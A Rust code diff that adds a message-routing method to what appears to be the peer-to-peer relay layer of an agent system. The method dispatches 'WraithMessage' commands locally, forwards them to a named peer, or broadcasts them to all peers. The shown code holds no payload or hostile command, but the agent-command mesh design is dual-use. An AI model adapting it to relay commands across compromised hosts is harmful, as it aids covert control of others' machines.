@@ -29,6 +29,50 @@ impl MessageDispatcher {
         Arc::clone(&self.agent_commands)
     }
 
+    /// Route a message: check target_wraith_id, forward to peer or broadcast
+    pub async fn route_message(
+        &self,
+        msg: WraithMessage,
+        state: Arc<Mutex<WraithState>>,
+    ) -> Option<WraithMessage> {
+        let target = msg.target_wraith_id.clone();
+        let local_id = state.lock().unwrap().wraith_id.clone();
+
+        // If targeted to us, dispatch locally
+        if target.is_empty() || target == local_id {
+            return self.dispatch(msg, state).await;
+        }
+
+        // If targeted to a direct peer, forward to that peer
+        {
+            let peer = state.lock().unwrap().peer_table.get(&target).cloned();
+            if let Some(peer) = peer {
+                // Clone to allow falling through to broadcast if send fails
+                if peer.sender.send(msg.clone()).await.is_ok() {
+                    return Some(MessageCodec::create_command_result(
+                        "".to_string(),
+                        "forwarded".to_string(),
+                        "".to_string(),
+                        0, 0, "".to_string(),
+                    ));
+                }
+            }
+        }
+
+        // Broadcast to all peers (except already-seen check done in caller)
+        let peers: Vec<_> = state.lock().unwrap().peer_table.values().cloned().collect();
+        for peer in peers {
+            let _ = peer.sender.send(msg.clone()).await;
+        }
+
+        Some(MessageCodec::create_command_result(
+            "".to_string(),
+            "broadcast".to_string(),
+            "".to_string(),
+            0, 0, "".to_string(),
+        ))
+    }
+
     pub async fn dispatch(&self, msg: WraithMessage, state: Arc<Mutex<WraithState>>) -> Option<WraithMessage> {
         let msg_type = msg.msg_type;
         info!("Dispatching message of type: {:?}", msg_type);
